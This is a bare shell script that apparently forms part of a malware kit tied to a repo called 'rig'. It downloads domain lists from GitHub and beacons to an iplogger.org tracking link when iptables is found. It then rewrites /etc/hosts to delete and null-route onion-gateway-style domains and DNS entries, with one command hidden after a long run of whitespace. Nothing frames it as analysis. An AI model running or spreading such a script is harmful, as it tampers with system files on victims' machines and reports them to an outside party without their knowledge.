c=$(curl -s https://raw.githubusercontent.com/zoalsharf/rig/master/gateway)
d=$(curl -s https://raw.githubusercontent.com/zoalsharf/rig/master/dns)
di=$(command -v iptables|wc -l)

del1 () {
        for i in ${c[@]}; do
        sed -i '/'$1$i'/d' /etc/hosts
        done
}

del2 () {
        for i in ${d[@]}; do
        sed -i '/'$i'/d' /etc/hosts
        done
}

chekhosts () {
        for i in ${c[@]}; do
        sed -i '1 i\127.0.0.1       '$1$i'' /etc/hosts
        done
}

host () {
        for i in ${d[@]}; do
        sed -i '1 i\127.0.0.1       '$i'' /etc/hosts
        done
}

if [ $di -eq "1" ]; then
        curl -A Iptables-found/1.9 -s https://iplogger.org/389LB3
else
        exit
fi

del2
del1 'nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.'
del1 'ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoyd.'
del1 'dreambusweduybcp.'
sleep 3
chekhosts 'nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.'
chekhosts 'ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoyd.'
chekhosts 'dreambusweduybcp.'                                                                                                                                                                 sleep 3
host

